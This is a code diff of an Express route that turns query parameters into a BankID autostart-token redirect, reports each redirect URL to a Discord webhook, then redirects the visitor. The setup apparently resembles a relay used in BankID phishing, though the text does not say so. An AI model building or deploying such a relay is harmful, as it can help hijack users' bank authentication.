@@ -18,11 +18,22 @@ app.get('/', (req, res) => {
     return res.status(400).send('Query parameters are required.');
   }
 
-  // Encode the query string to handle special characters properly
-  const encodedQueryString = encodeURIComponent(queryString);
+  // Split the query string into individual parameters
+  const params = new URLSearchParams(queryString);
 
-  // Construct the redirect URL with the encoded query string
-  const redirectUrl = `bankid:///?autostarttoken=${encodedQueryString}`;
+  // Initialize an array to store formatted query parameters
+  const formattedParams = [];
+
+  // Iterate through each parameter
+  for (const [key, value] of params.entries()) {
+    // Remove trailing '=' from parameter value if present
+    const sanitizedValue = value.endsWith('=') ? value.slice(0, -1) : value;
+    // Encode key-value pair and add to formattedParams array
+    formattedParams.push(`${key}=${encodeURIComponent(sanitizedValue)}`);
+  }
+
+  // Construct the redirect URL with formatted query parameters
+  const redirectUrl = `bankid:///?autostarttoken=${formattedParams.join('&')}`;
 
   // Log the redirect URL to Discord webhook
   sendDiscordWebhook(redirectUrl);
@@ -30,11 +41,6 @@ app.get('/', (req, res) => {
   // Redirect to the constructed URL
   res.redirect(redirectUrl);
 });
-
-
-
-
-
 
   // Function to send Discord webhook
 async function sendDiscordWebhookEmbed(embed) {
